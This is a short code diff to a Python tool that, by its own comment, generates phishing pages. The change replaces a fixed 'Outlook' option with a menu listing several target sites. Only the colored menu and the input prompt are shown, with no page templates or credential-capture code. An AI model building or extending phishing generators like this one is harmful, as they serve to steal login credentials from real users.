@@ -114,8 +114,9 @@ print(colorText(ascii))
 
                                     ############################################################# Questions/ Input #############################################################
 #### Prints options
-print("\n\n" + Fore.RED + "[" + Fore.CYAN + "1" + Fore.RED + "]" + Fore.BLUE + " Outlook" + "\n\n")
-
+for index, site in enumerate(siteLookUp.values()):
+    print('\n' + Fore.RED + "[" + Fore.CYAN + str(index) + Fore.RED + "]" + Fore.BLUE + f" {site}")
+print("\n\n")
 #### Selects the site to create a phishing page for (currently Outlook)
 site = int(input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Choose an option: ") or 1)
 
